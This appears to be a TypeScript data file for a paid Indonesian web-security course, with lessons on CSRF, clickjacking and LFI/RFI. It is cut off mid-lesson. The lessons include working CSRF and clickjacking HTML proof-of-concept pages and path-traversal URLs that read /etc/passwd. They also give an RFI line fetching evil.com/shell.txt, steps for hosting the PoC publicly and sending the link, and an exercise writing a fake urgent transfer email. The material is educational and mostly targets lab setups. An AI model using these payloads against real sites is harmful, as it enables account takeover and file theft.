// CyberEd — Materi Serangan Batch 2: CSRF, Clickjacking, LFI/RFI
import type { MateriData } from '../materi-content/runner';

export const seranganWeb2: MateriData[] = [
  // ============================ CSRF ============================
  {
    judul: '⚔️ Cross-Site Request Forgery (CSRF) — Paksa User Lakukan Aksi',
    emoji: '⚔️',
    deskripsi: 'Pelajari cara membuat halaman PoC yang auto-submit form ke situs lain, bagaimana attacker pakai session korban tanpa diketahui, dan防御 dengan CSRF token + SameSite cookie.',
    level: 'menengah',
    harga: 20000,
    hargaCoret: 30000,
    isGratis: false,
    tipe: 'serangan',
    tujuan: 'Kamu paham apa itu CSRF, mampu membuat halaman PoC (Proof of Concept) yang memicu aksi sensitif (transfer/ganti password) tanpa sepengetahuan korban, dan paham防御 server-side (CSRF token, SameSite, Origin check).',
    analogy: 'Bayangkan kamu di restoran. Pelayan mempercayaimu karena kamu pelanggan tetap. Tiba-tiba, orang asing diam-diam menyelipkan pesan "Minta tolong bayar semua makanan teman-teman saya" — kamu antar ke pelayan sambil curiga. Pelayan nurut karena dia percaya kamu. CSRF persis begitu: server percaya browser korban (karena session aktif), tapi yang ngirim request sebenarnya orang lain yang memanfaatkan kepercayaan itu.',
    apaItu: 'Cross-Site Request Forgery (CSRF) adalah serangan yang mengeksploitasi kepercayaan server terhadap browser user. Saat user login ke sebuah situs (misal bankonline), browser menyimpan cookie session. Selama session aktif, browser OTOMATIS kirim cookie itu ke domain yang sama untuk SETIAP request (termasuk yang berasal dari halaman lain).\n\nPenyerang membuat halaman berisi form/URL yang auto-trigger aksi penting (transfer, ganti password, hapus akun) ke situs bank. Saat korban buka halaman penyerang sambil MASIH login ke bank, request terkirim dengan cookie sah → aksi terjadi tanpa konfirmasi user.',
    caraKerja: '1) User login ke bankonline.com → cookie session disimpan di browser.\n2) User tanpa Logout buka halaman lain: evil.com.\n3) Halaman evil.com berisi form auto-submit dengan action = bankonline.com/transfer (POST) dan field account tujuan = rekening penyerang.\n4) Browser kirim POST ke bankonline.com.\n5) Browser OTOMATIS sertakan cookie session bankonline (karena domain tujuan = bankonline.com).\n6) Bank cek cookie → valid. Bank proses transfer tanpa curiga.\n7) Uang pindah ke rekening penyerang. Korban tidak klik apa-apa.',
    asciiDiagram: "[ User login ke bankonline.com ]\n              |\n              v\n[ Browser menyimpan cookie session ]\n              |\n              | tanpa logout, user buka evil.com\n              v\n[ evil.com punya form auto-submit ]\n              |\n              | POST ke bankonline.com/transfer\n              v\n[ Browser kirim cookie + POST request (sah) ]\n              |\n              v\n[ Bank cek session -> VALID -> proses transfer ]\n              |\n              v\n[ Uang pindah ke rekening penyerang ]\n              v\n[ Korban tidak sadar ]",
    senjata: {
      pc: '**Burp Suite Community** (intercept dan replay), browser **Chrome**, text editor (Notepad / VS Code) untuk bikin HTML PoC, Python HTTP server (`python -m http.server`).',
      hp: 'Termux + Python untuk HTTP server, **Firefox Android** untuk buka PoC (support autofit lebih baik).',
    },
    metode: [
      {
        nama: 'Metode 1: Identifikasi Target Rentan CSRF (Pemula)',
        level: 'pemula',
        deskripsi: 'Sebelum bikin PoC, kita cari tahu apakah target aplikasi rentan. Cara cek: login, capture request dengan Burp, hapus token, replay. Kalau server masih proses = rentan.',
        prasyarat: [
          'DVWA / HackTheBox / target lab sudah siap',
          'Burp Suite Community Edition terinstall',
          'Browser Chrome dengan proxy setting 127.0.0.1:8080',
          'Tidak perlu kemampuan coding tinggi',
        ],
        langkah: [
          {
            judul: 'Login ke target + aktifkan Burp intercept',
            aksi: 'Kalian buka Burp Suite. Tab Proxy → pastikan "Intercept is on". Buka Chrome → buka DVWA atau target lab → login dengan akun biasa. Setelah login, coba lakukan aksi sensitif: klik tombol "Change Password", atau jika ada "Transfer Money", atau "Update Profile". Burp akan INTERCEPT request itu (terlihat di Burp window "Intercept").',
            expected: 'Request POST muncul di Burp intercept window, dengan header Cookie, body berisi parameter form.',
          },
          {
            judul: 'Cek apakah ada CSRF token di body request',
            aksi: 'Di Burp intercept window, liat tab "Params" atau "Raw". Perhatikan apakah ada parameter bernama `csrf_token`, `_csrf`, `anti_csrf`, `user_token`, atau hidden input dengan nilai random. Kalau ADA → target pakai proteksi CSRF token. Kalau TIDAK ADA → target rentan CSRF (low effort attack possible).',
            expected: 'Daftar parameter terlihat. Catat apakah ada token CSRF.',
          },
          {
            judul: 'Kirim request ke Repeater (hapus token)',
            aksi: 'Di Burp intercept → klik kanan request → "Send to Repeater". Tab Repeater terbuka. Sekarang hapus SEMUA field yang terlihat seperti CSRF token. Klik tombol "Send" di Repeater.\n\nHasil yang ditunggu:\n- Status 200 OK + response sukses → TARGET RENTAN CSRF! 🎉\n- Status 403 Forbidden atau error "invalid token" → target protected.',
            expected: 'Response status code dari server, biasanya 200 OK kalau rentan.',
          },
          {
            judul: 'Alternatif: coba request via curl langsung',
            aksi: 'Untuk konfirmasi tanpa Burp, pakai curl dengan cookie yang kamu capture: copy cookie dari Burp, lalu jalankan: `curl -X POST http://target/change_password -b "PHPSESSID=xxx" -d "new_password=hacked&confirm=hacked"`. Kalau response sukses = rentan.',
            command: 'curl -X POST http://target/change_password -b "PHPSESSID=YOUR_COOKIE" -d "new_password=hacked&confirm=hacked"',
            expected: 'Response dengan status 200 dan body sukses (atau HTML form confirm).',
          },
        ],
        outputAkhir: 'Berhasil mengidentifikasi setidaknya 1 endpoint sensitif di target yang rentan CSRF.',
        kesalahanUmum: [
          {
            masalah: '❌ Burp tidak intercept HTTPS',
            solusi: 'Install Burp CA cert: buka http://burp di Chrome, download cert, install di browser trust store. Tanpa CA cert, HTTPS request tidak bisa dibaca.',
          },
          {
            masalah: '❌ Request balik status 302 (redirect ke login)',
            solusi: 'Session cookie expire. Login ulang, capture cookie BARU, ulangi.',
          },
          {
            masalah: '❌ Tidak ada request sensitif sama sekali',
            solusi: 'Mungkin target aman. Coba halaman "Add to Cart" atau "Logout" sebagai ganti — itu aksi yang lebih sederhana yang biasanya tidak diproteksi.',
          },
        ],
      },
      {
        nama: 'Metode 2: HTML PoC dengan Auto-Submit Form (Menengah)',
        level: 'menengah',
        deskripsi: 'Setelah endpoint rentan didapat, kita buat halaman HTML yang auto-submit form ke endpoint target saat korban buka. Form berjalan INVISIBLE tanpa user klik apa-apa.',
        prasyarat: [
          'Sudah selesai Metode 1 — endpoint rentan dan URL-nya sudah diketahui',
          'PC / HP untuk serve HTML via Python http server',
          'Browser korban (bisa diri sendiri untuk testing)',
        ],
        langkah: [
          {
            judul: 'Tulis HTML PoC dengan auto-submit form',
            aksi: 'Kalian buka text editor (nano / VS Code). Buat file `csrf-poc.html`. Tulis HTML berikut (ganti URL dan field sesuai target):\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<form action="http://target.com/change_password" method="POST" id="f">\n  <input type="hidden" name="new_password" value="hacked123">\n  <input type="hidden" name="confirm_password" value="hacked123">\n</form>\n<script>document.getElementById("f").submit();</script>\n</body>\n</html>\n```\n\nPenjelasan: `<script>document.getElementById("f").submit();</script>` artinya saat halaman dimuat, form otomatis di-submit. Korban tidak perlu klik — cuma buka halaman = kena.',
            command: 'nano csrf-poc.html',
            expected: 'File HTML tersimpan dengan form auto-submit.',
          },
          {
            judul: 'Jalankan Python HTTP server lokal',
            aksi: 'Buka terminal. Pindah ke folder tempat poc.html: `cd ~/Desktop` (atau folder file). Jalankan: `python3 -m http.server 8080`. Server jalan di port 8080. Sekarang halaman bisa diakses dari URL `http://localhost:8080/csrf-poc.html`.',
            command: 'cd ~/Desktop && python3 -m http.server 8080',
            expected: 'Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...',
          },
          {
            judul: 'Tes ke diri sendiri (login dulu, baru buka POC)',
            aksi: 'BUKA CHROME → LOGIN ke target dulu (misal DVWA). DI TAB LAIN, akses `http://localhost:8080/csrf-poc.html`. Jangan tutup session target.\n\nHalaman PoC akan auto-load → form auto-submit → request ke target dengan cookie aktif. Beberapa detik kemudian, silakan cek target — apakah password admin sudah berubah jadi `hacked123`?\n\n🎉 CSRF terkonfirmasi.',
            command: 'http://localhost:8080/csrf-poc.html',
            expected: 'Halaman redirect balik ke target (atau blank). Cek apakah password target sudah berubah.',
          },
          {
            judul: 'Variasi: pakai iframe tersembunyi',
            aksi: 'Alternatif lain yang lebih stealth — pakai `<iframe>` 0×0 pixel:\n\n```html\n<iframe src="csrf-poc.html" style="display:none"></iframe>\n```\n\nAtau bahkan murni pakai `<img>` untuk trigger GET request dengan parameter di URL: `<img src="http://target/transfer?to=ATTACKER&amount=1000">`. GET request biasanya kena proteksi CSRF lebih lemah (server jarang pakai token di GET).',
          },
        ],
        outputAkhir: 'Berhasil membuat halaman PoC CSRF yang auto-submit. Testing ke diri sendiri sukses. Logic/logic CSRF dipahami sepenuhnya.',
        kesalahanUmum: [
          {
            masalah: '❌ Form tidak auto-submit',
            solusi: 'Cek JavaScript console (F12) error. Pastikan id form benar. Coba alternatif: `<body onload="document.forms[0].submit()">` di tag body.',
          },
          {
            masalah: '❌ Cookie tidak terkirim saat form submit',
            solusi: 'Cookie SameSite=Strict tidak akan dikirim cross-site. Untuk lab, pakai target SameSite=None atau gunakan DVWA yang dapat dikonfigurasi. Atau buat cookie manual via DevTools.',
          },
          {
            masalah: '❌ Action URL tidak match dengan target',
            solusi: 'Cek URL target persis (case-sensitive, trailing slash). Untuk DVWA, biasanya `http://localhost/vulnerabilities/csrf/`. Lihat path lengkap dari Burp.',
          },
        ],
      },
      {
        nama: 'Metode 3: Hosting PoC Online + Variasi Link (Lanjut)',
        level: 'lanjut',
        deskripsi: 'Untuk simulasi serangan RIELL (kalau kamu dapat izin tertulis untuk pengujian internal), kita host PoC di internet. Gratis dan cepat.',
        prasyarat: [
          'Akun GitHub (gratis) atau Netlify / Vercel',
          'File HTML PoC dari Metode 2',
          'Untuk lab resmi dengan izin tertulis',
        ],
        langkah: [
          {
            judul: 'Push PoC ke GitHub Pages',
            aksi: 'Kalian buat repository baru di GitHub, misal `csrf-lab`. Upload file `csrf-poc.html` ke repository. Lalu buka Settings → Pages → pilih branch `main` → klik Save. Beberapa detik kemudian, halaman live di `https://username.github.io/csrf-lab/csrf-poc.html`.\n\n🎉 Sekarang halaman bisa diakses dari internet oleh siapapun yang punya link.',
            expected: 'URL GitHub Pages aktif dan menampilkan form auto-submit.',
          },
          {
            judul: 'Alternatif: pakai Netlify drop',
            aksi: 'Kalau tidak mau pakai GitHub, ada opsi lebih cepat: buka https://app.netlify.com/drop. Drag-and-drop folder berisi `csrf-poc.html`. Netlify langsung kasih URL publik seperti `https://cute-name-123.netlify.app/csrf-poc.html`. Bisa dipakai dalam 30 detik!',
            expected: 'URL Netlify unik aktif.',
          },
          {
            judul: 'Cara pengiriman ke target (simulasi)',
            aksi: 'Untuk simulasi internal berizin: buat link PoC, kirim via email/chat ke target (yang sudah login). Mereka buka link → tanpa sadar → aksi sensitif terjadi di session mereka.\n\nUntuk lab: kirim ke diri sendiri atau teman yang setuju. SELALU dengan izin tertulis.',
            catatan: '⚠️ PENTING: Tanpa izin tertulis, mengirim link apapun yang memicu perubahan ke sistem orang lain = ilegal.',
          },
        ],
        outputAkhir: 'Berhasil hosting PoC online dan paham cara distribusi. Pemahaman penuh tentang siklus hidup serangan CSRF.',
        kesalahanUmum: [
          {
            masalah: '❌ GitHub Pages tidak aktif',
            solusi: 'Cek repo Public (Pages tidak jalan di private). Pastikan index.html atau nama file benar. Tunggu 2-3 menit setelah save.',
          },
          {
            masalah: '❌ Halaman ditampilkan GitHub raw source (bukan rendered)',
            solusi: 'Pastikan URL Pages: `https://username.github.io/repo-name/file.html`, bukan `https://github.com/username/repo-name/blob/main/file.html`.',
          },
        ],
      },
    ],
    mitigasi: 'Pertahanan dari CSRF:\n\n**1. CSRF Token (WAJIB)**: setiap form sensitif harus berisi token random unik per session. Server cek token setiap request. Token harus tidak bisa ditebak attacker (pakai CSPRNG).\n\n**2. SameSite Cookie**: `SameSite=Strict` atau `Lax`. Browser TIDAK kirim cookie ini ke cross-site request, sehingga CSRF otomatis gagal.\n\n**3. Double Submit Cookie**: server set cookie + terima di body, bandingkan. Stateless, sederhana.\n\n**4. Origin/Referer Check**: server cek header Origin/Referer pastikan request dari domain sendiri.\n\n**5. Re-authentication**: untuk aksi sangat sensitif (transfer, hapus akun), minta user input password lagi.\n\n**6. CAPTCHA**: tambah reCAPTCHA pada aksi sensitif untuk cross-check ini bukan bot.',
    latihan: [
      '🔰 Di DVWA, cek apakah halaman "Change Password" rentan. Buat PoC.csrf-poc.html auto-submit ke change_password.',
      '🔰 Pasang Burp CA Cert di Chrome, intercept DVWA login. Cari field CSRF token default.',
      '🟡 Buat email simulasi (jangan kirim ke orang nyata) yang seolah-olah dari bos minta urgent transfer. Link ke PoC. Understand social engineering di CSRF.',
      '🟡 Pelajari SameSite=Strict vs Lax bedanya. Setting bisa dicek di DevTools → Application → Cookies.',
      '🔴 Latihan HackTheBox atau CTF yang punya challenge CSRF. Selesaikan pakai teknik dari materi ini.',
    ],
    faq: [
      { q: 'Apa beda CSRF dan XSS?', a: 'CSRF tidak butuh JavaScript — cukup HTML. XSS menyuntik script yang jalan di korban. CSRF memanfaatkan session valid korban, XSS mencuri session korban.' },
      { q: 'Apakah semua website rentan CSRF?', a: 'Tidak. Website modern dengan framework (Rails, Django, Spring) dan SameSite cookies otomatis aman. Yang rentan biasanya: aplikasi legacy custom tanpa framework, API endpoint tanpa token.' },
      { q: 'Bagaimana SameSite=Lax vs Strict?', a: 'Strict: cookie tidak dikirim ke cross-site request sama sekali. Paling aman tapi bisa break link dari email/chat. Lax: cookie dikirim untuk top-level navigation GET (klik link aman), tapi tidak untuk POST. Rekomendasi default.' },
      { q: 'CSRF masih relevan di 2024?', a: 'Relevan untuk API endpoint dan form custom yang tidak pakai framework. Banyak SaaS modern sudah aman, tapi lupa implement sekali saja sudah jadi bug besar.' },
    ],
    ringkasan: [
      'CSRF = server percaya browser korban → attacker exploit kepercayaan itu',
      'Syarat sukses: user login di situs A + visit situs B + form auto-submit ke A',
      'TIDAK butuh JavaScript (opsional, payload lebih simple)',
      'Token CSRF = pertahanan utama + SameSite Cookie (Lax/Strict)',
      'Tool identifikasi: Burp Suite → Repeater → hapus token → kirim ulang',
      'Latihan aman: DVWA via Docker (login admin/password)',
      'Tanda rentan: aksi sensitif tanpa token atau tanpa Origin check',
    ],
    materiRelated: ['XSS', 'Session Hijacking', 'Secure Coding', 'WAF Setup'],
  } as MateriData,
  // ============================ CLICKJACKING ============================
  {
    judul: '🎭 Clickjacking — Tipu User Klik Tanpa Sadar',
    emoji: '🎭',
    deskripsi: 'Pelajari cara membuat iframe transparan yang menimpa UI asli, agar user klik tombol "Delete Account" padahal mereka kira klik "Lihat Video Lucu".',
    level: 'mudah',
    harga: 10000,
    hargaCoret: 18000,
    isGratis: false,
    tipe: 'serangan',
    tujuan: 'Kamu paham konsep clickjacking, mampu membuat halaman PoC dengan iframe transparan yang menimpa tombol sensitif, dan tahu防御 X-Frame-Options + CSP frame-ancestors.',
    analogy: 'Bayangkan undian berhadiah besar dengan tombol "Klik untuk Menang!". Tombol itu besar dan menarik. Tapi di balik tombol, ada tombol "Transfer Rp 50.000.000 ke rekening asing". User mengira dia klik "menang undian", padahal dia klik "transfer". Tombol asli tersembunyi di balik tombol palsu — clicked innocent action = destructive action.',
    apaItu: 'Clickjacking (alias UI Redressing) adalah serangan di mana attacker "menutup" halaman web asli dengan iframe transparan atau elemen UI lainnya, sehingga user dengan tanpa sadar mengklik tombol sensitif di halaman asli (misal "Hapus Akun", "Setujui Transfer") padahal mereka kira mengklik hal lain.\n\nYang membuat serangan ini unik: target tidak perlu vulnerable code, hanya tampilan UI yang dimanipulasi. Yang dibutuhkan biasanya cuma target mengijinkan dirinya di-embed dalam iframe.',
    caraKerja: '1) Attacker buat halaman HTML berisi iframe dengan `src="http://target.com/aksi_sensitif"` (misal halaman hapus akun).\n2) Iframe dibuat transparan (`opacity: 0`) dan diposisikan sedemikian rupa sehingga tombol sensitif di target tepat berada di lokasi tombol "palsu" yang attacker taruh di halaman.\n3) User buka halaman attacker — melihat tombol "Lihat Video Kucing" tapi klik sebenarnya jatuh ke tombol asli target.\n4) Aksi sensitif terjadi tanpa user sadari.',
    asciiDiagram: "BROWSER USER melihat:\n+---------------------------------------+\n|  Halaman Penyerang (evil.com)         |\n|                                       |\n|     +-------------------------+       |\n|     | Tombol PALSU (lucu)     |       |\n|     | \"Lihat kucing imut!\"   |       |\n|     +-------------------------+       |\n|                                       |\n|     (di balik tombol, ada iframe      |\n|      transparan target = halaman      |\n|      hapus akun, tombol \"Hapus\" ada   |\n|      di koordinat yang sama)         |\n|                                       |\n+---------------------------------------+\n\nUSER KLIK:\n- kira klik \"Lihat kucing\"\n- sebenarnya klik \"Hapus Akun\" di target\n- target memproses aksi tanpa user tahu",
    senjata: {
      pc: 'Browser Chrome, text editor (VS Code / nano), Python HTTP server untuk hosting PoC. Tidak butuh tool attack apapun.',
      hp: 'Chrome Android + text editor (QuickEdit). Termux + Python http server.',
    },
    metode: [
      {
        nama: 'Metode 1: PoC Clickjacking Iframe Transparan (Pemula)',
        level: 'pemula',
        deskripsi: 'Cara paling jelas: buat halaman HTML dengan iframe transparan + tombol overlay. Pasien akan klik tombol sensitive saat dia mengira klik tombol lain.',
        prasyarat: [
          'Target yang masih boleh di-embed di iframe (tidak ada X-Frame-Options)',
          'Browser Chrome + text editor',
          'Python untuk serve local (opsional)',
        ],
        langkah: [
          {
            judul: 'Cek apakah target membolehkan iframe',
            aksi: 'Kalian buka Chrome → akses target (misal DVWA via Docker login dulu). Tekan F12 → tab Network → refresh → klik request HTML response → cari header `X-Frame-Options`. Kalau tidak ada → target BISA di-iframe.\n\nCara cepat: buat file test: `<iframe src="http://target" width="500" height="500"></iframe>` — buka di browser. Kalau halaman TARGET muncul di iframe → rentan. Kalau halaman blank → aman.',
            command: '<iframe src="http://target.com" width="500" height="500"></iframe>',
            expected: 'Halaman target tampil di iframe kalau rentan. Blank / error kalau aman.',
          },
          {
            judul: 'Tulis HTML PoC clickjacking',
            aksi: 'Buat file `clickjacking.html`. Isi:\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<div style="position: relative; width: 500px; height: 300px;">\n  <iframe src="http://target.com/sensitive-page" \n          style="opacity: 0.1; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2;">\n  </iframe>\n  <div style="position: absolute; top: 140px; left: 100px; z-index: 1; \n              background: yellow; padding: 20px; cursor: pointer;">\n    Klik untuk menang undian! 🎁\n  </div>\n</div>\n</body>\n</html>\n```\n\nPenjelasan: iframe dengan opacity 0.1 (90% transparan, masih sedikit kelihatan) + button kuning dummy di atasnya. User yang klik kuning sebenarnya klik apa yang ada di iframe di bawahnya.',
            command: 'nano clickjacking.html',
            expected: 'File HTML clickjacking tersimpan.',
          },
          {
            judul: 'Jalankan server lokal & tes',
            aksi: 'Buka terminal, jalanin server: `python3 -m http.server 8080`. Di browser akses `http://localhost:8080/clickjacking.html`. Kamu akan lihat tombol kuning bertuliskan undian, dan di baliknya (sedikit kelihatan karena opacity 0.1) iframe berisi target sensitif. Coba Klik tombol kuning. Aksi sensitif di target terjadi.',
            command: 'python3 -m http.server 8080',
            expected: 'Halaman loading. Klik tombol kuning = trigger aksi target.',
          },
          {
            judul: 'Variasi: opacity 0 (sepenuhnya transparan)',
            aksi: 'Buat iframe benar-benar invisible: ganti `opacity: 0.1` jadi `opacity: 0`. User cuma lihat tombol kuning, tanpa sadar ada iframe di bawah. Lebih stealth tapi untuk laboratorium biasanya opacity 0.1 biar debugging lebih mudah.',
          },
        ],
        outputAkhir: 'Berhasil membuat halaman clickjacking yang trigger aksi sensitif saat user klik tombol palsu.',
        kesalahanUmum: [
          {
            masalah: '❌ Iframe blank / tidak muncul',
            solusi: 'Target ada `X-Frame-Options: DENY` atau `Content-Security-Policy: frame-ancestors \'none\'`. Cari target lain yang belum proteksi iframe.',
          },
          {
            masalah: '❌ Iframe muncul tapi klik jatuh ke iframe, bukan trigger target',
            solusi: 'Cek koordinat tombol asli (DevTools di target → inspect tombol → catat position absolute). Sesuaikan posisi iframe + tombol overlay supaya pas.',
          },
          {
            masalah: '❌ Server tidak jalan / 404 page',
            solusi: 'Cek path python http.server: harus di folder yang sama dengan HTML. Cek port: `python3 -m http.server 8080` — akses URL yang sesuai.',
          },
        ],
      },
      {
        nama: 'Metode 2: Clickjacking + CSRF Combo Attack (Menengah)',
        level: 'menengah',
        deskripsi: 'Combo attack: pakai clickjacking untuk trigger CSRF — user klik tombol lucu tapi yang terjadi adalah perubahan password / transfer / hapus akun mereka sendiri.',
        prasyarat: [
          'Sudah selesai Metode 1',
          'Target yang juga rentan CSRF (biasanya halaman sensitif)',
        ],
        langkah: [
          {
            judul: 'Kombinasikan iframe sensitif + CSRF auto-submit',
            aksi: 'Buat file `combo.html`:\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<div style="position: relative; width: 800px; height: 600px;">\n  <iframe src="http://target/sensitive-form" \n          style="opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2;">\n  </iframe>\n  <button onclick="this.style.display=\'none\'" \n          style="position: absolute; top: 100px; left: 200px; z-index: 1; \n                 font-size: 24px; padding: 30px; cursor: pointer;">\n    🎉 Klik untuk lihat hadiah! 🎁\n  </button>\n</div>\n</body>\n</html>\n```\n\nUser klik tombol → jika form sensitif target sudah terisi otomatis oleh CSRF (misal `<input value="hacked">`), user secara tidak sadar submit form itu.',
          },
          {
            judul: 'Tes dengan login session aktif',
            aksi: 'Login dulu ke target di tab Chrome lain. Buka `http://localhost:8080/combo.html` di tab lain (jangan tutup session target). Klik tombol hadiah. Lihat apa yang terjadi di target: apakah ada perubahan data / aksi delete / perubahan status?',
          },
        ],
        outputAkhir: 'Berhasil membuat combo clickjacking + CSRF. Pemahaman bahwa clickjacking biasanya ENSEM dengan tipe serangan lain.',
        kesalahanUmum: [
          { masalah: '❌ Form target tidak auto-submit saat di-iframe', solusi: 'Butuh JavaScript tambahan untuk auto-submit atau user harus klik tombol target secara manual (yang merupakan vektor clickjacking).' },
        ],
      },
    ],
    mitigasi: 'Pertahanan dari Clickjacking:\n\n**1. X-Frame-Options Header** (legacy, masih banyak dipakai):\n- `X-Frame-Options: DENY` → tIDAK BOLEH di-frame sama sekali\n- `X-Frame-Options: SAMEORIGIN` → hanya boleh di-frame dari domain sama\n\n**2. CSP frame-ancestors (modern, recommended)**:\n`Content-Security-Policy: frame-ancestors \'none\'` → DENY semua\n`Content-Security-Policy: frame-ancestors \'self\'` → SAMEORIGIN\n`Content-Security-Policy: frame-ancestors https://trusted.com` → whitelist partner\n\n**3. Frame-Breaking JavaScript** (fallback jika header tidak bisa):\n```js\nif (top !== self) { top.location = self.location; }\n```\nScript ini deteksi jika halaman sedang di-frame, lalu redirect halaman PARENT ke halaman asli. Tapi attacker bisa disable JS via sandbox attribute.\n\n**4. SameSite Cookie**: tambahanCookie tanpa SameSite bisa kena CSRF via iframe.',
    latihan: [
      '🔰 Buat halaman clickjacking untuk DVWA. Pilih target halaman logout (cek apakah bisa di-iframe).',
      '🔰 Cek 3 website populer pakai F12 → Network → response headers. Apakah punya X-Frame-Options?',
      '🟡 Setup Nginx reverse proxy dengan `add_header X-Frame-Options "SAMEORIGIN"`. Tes iframe — sekarang blocked.',
      '🟡 Bandingkan X-Frame-Options DENY vs SAMEORIGIN vs CSP frame-ancestors \'self\'.',
      '🔴 Pelajari "Likejacking" — varian clickjacking di Facebook Like button (sudah dimitigasi Facebook sekarang).',
    ],
    faq: [
      { q: 'Apakah clickjacking masih relevan di 2024?', a: 'Masih, terutama untuk situs tanpa X-Frame-Options header. Browser modern sudah mitigasi banyak, tapi masih banyak situs yang lupa.' },
      { q: 'Bagaimana cara deteksi clickjacking secara otomatis?', a: 'Cek X-Frame-Options / CSP frame-ancestors header. Tools: Mozilla Observatory, SecurityHeaders.com. Sub-resource nya juga wajib dicek.' },
      { q: 'Apakah SameSite cookie cukup untuk block clickjacking?', a: 'Tidak. SameSite melindungi dari CSRF cross-site. Clickjacking masih bisa berjalan selama target bisa di-iframe. Tetap butuh X-Frame-Options.' },
      { q: 'Apakah frame-ancestors sama dengan X-Frame-Options?', a: 'CSP frame-ancestors superset X-Frame-Options. Browser modern dukung CSP. Rekomendasi: pakai CSP frame-ancestors, X-Frame-Options sebagai fallback untuk browser lama.' },
    ],
    ringkasan: [
      'Clickjacking = tipu user klik tanpa sadar (UI Redressing)',
      'Cara kerja: iframe transparan + tombol overlay',
      'Vector: target mengijinkan dirinya di-frame (no X-Frame-Options)',
      'Tanda rentan: `<iframe src="target">` di Chrome = halaman target tampil',
      'Tool: Burp Suite untuk cek header, atau langsung buat HTML PoC',
      'Pertahanan utama: `X-Frame-Options: DENY` atau `Content-Security-Policy: frame-ancestors \'none\'`',
      'Varian: likejacking (Facebook), cursorjacking (ganti cursor), filejacking (download',
    ],
    materiRelated: ['XSS', 'CSRF', 'WAF Setup', 'Secure Coding'],
  } as MateriData,
  // ============================ LFI / RFI ============================
  {
    judul: '📁 Local & Remote File Inclusion (LFI/RFI) — Include File Berbahaya',
    emoji: '📁',
    deskripsi: 'Pelajari cara exploit LFI untuk baca file server sensitif (/etc/passwd) dan RFI untuk menjalankan kode eksternal. Termasuk bypass filter dengan ../ dan php wrapper.',
    level: 'menengah',
    harga: 20000,
    hargaCoret: 30000,
    isGratis: false,
    tipe: 'serangan',
    tujuan: 'Kamu paham perbedaan LFI dan RFI, mampu membaca file sensitif server via path traversal, dan tahu防御 disable allow_url_include + input validation + chroot.',
    analogy: 'Bayangkan restoran dengan dapur terbuka. Pelayan ambil bahan mentah dari rak. Biasanya dia ambil dari rak "resep_restaurant". Tapi jika attacker bisa menulis "ambil dari rak /etc/password_pelanggan.txt", pelayan tanpa curiga akan ambil file itu dan menggunakan isinya untuk hidangan. LFI/RFI persis begitu: attacker memaksa server include file arbitrary.',
    apaItu: 'Local File Inclusion (LFI) adalah vulnerability di mana attacker bisa menyertakan file lokal server (yang mungkin sensitif seperti /etc/passwd) melalui parameter aplikasi. Remote File Inclusion (RFI) adalah varian yang lebih parah — attacker menyertakan file dari SERVER MILIK MEREKA, langsung mendapatkan eksekusi kode.\n\nBiasanya muncul di aplikasi PHP pakai `include()`, `require()`, `file_get_contents()` dengan parameter dari user yang tidak difilter.',
    caraKerja: 'Aplikasi vulnerable biasanya memiliki kode seperti:\n```php\n$page = $_GET["page"];\ninclude("pages/" . $page . ".php");\n```\n\nKalau attacker ubah `?page=../../../etc/passwd%00`, server include file `/etc/passwd`. Karakter `%00` adalah null byte — versi lawas PHP bisa berhenti membaca string di sini, sehingga `.php` di akhir diabaikan. Versi PHP baru sudah fix null byte, tapi path traversal `../` masih sering kena.\n\nUntuk RFI: `?page=http://attacker.com/evil.php` — include file dari server luar. Server download & execute kode PHP attacker.',
    asciiDiagram: "VULNERABLE PHP CODE:\n  $page = $_GET[\"page\"];\n  include(\"pages/\" . $page . \".php\");\n\nNORMAL REQUEST:\n  ?page=about\n  -> include \"pages/about.php\" (aman)\n\nLFI ATTACK:\n  ?page=../../../etc/passwd%00\n  -> include \"../../../etc/passwd\0.php\" (baca /etc/passwd)\n\nRFI ATTACK:\n  ?page=http://evil.com/shell.txt\n  -> include \"pages/http://evil.com/shell.txt.php\" (download + execute)",
    senjata: {
      pc: 'Browser Chrome. Untuk RFI perlu server hosting file PHP sendiri (bisa pakai VPS lab).',
      hp: 'Chrome Android untuk eksplorasi. Untuk server hosting pakai PC VPS lab.',
    },
    metode: [
      {
        nama: 'Metode 1: Deteksi & LFI Basic dengan ../ (Pemula)',
        level: 'pemula',
        deskripsi: 'Cara paling jelas untuk uji LFI: tambahkan `../` di parameter URL dan lihat apakah halaman sensitif muncul. Jika iya = LFI terkonfirmasi.',
        prasyarat: [
          'Target aplikasi yang include file via parameter (DVWA / HackTheBox)',
          'Browser Chrome',
        ],
        langkah: [
          {
            judul: 'Buka target DVWA File Inclusion',
            aksi: 'Kalian login DVWA (security level Low). Klik "File Inclusion" di menu kiri. Halaman punya 3 link: `?page=file1.php`, `?page=file2.php`, `?page=file3.php`. Setiap link akan menampilkan isi file. URL di address bar menunjukkan parameter `page`.',
          },
          {
            judul: 'Uji LFI via path traversal../',
            aksi: 'Coba ganti parameter `page` dengan path ke file sistem Linux. Coba: `?page=../../../../../etc/passwd`. URL lengkap: `http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd`. Tekan Enter.\n\n🎉 Kalau halaman menampilkan isi file `/etc/passwd` (daftar user sistem, banyak baris dimulai dengan `root:x:0:0:...`) artinya LFI BERHASIL!',
            command: 'http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd',
            expected: 'Isi /etc/passwd: root:x:0:0:root:/root:/bin/bash ... daftar user sistem.',
          },
          {
            judul: 'Baca file konfig aplikasi',
            aksi: 'Sekarang coba baca file konfigurasi yang menarik:\n- `?page=../../../../etc/hostname` → nama host\n- `?page=../../../../var/www/html/index.php` → source code aplikasi\n- `?page=../../../../../../../etc/passwd` (../ lebih banyak) → traverse lebih dalam\n\nDVWA Low biasanya tanpa filter, jadi ../ sebanyak apapun akan jalan.',
            command: 'http://localhost/vulnerabilities/fi/?page=../../../../var/www/html/index.php',
            expected: 'Source code PHP aplikasi DVWA — lucu karena kamu bisa baca source code aplikasi.',
          },
          {
            judul: 'Cek apakah ada proteksi dengan bypass filter',
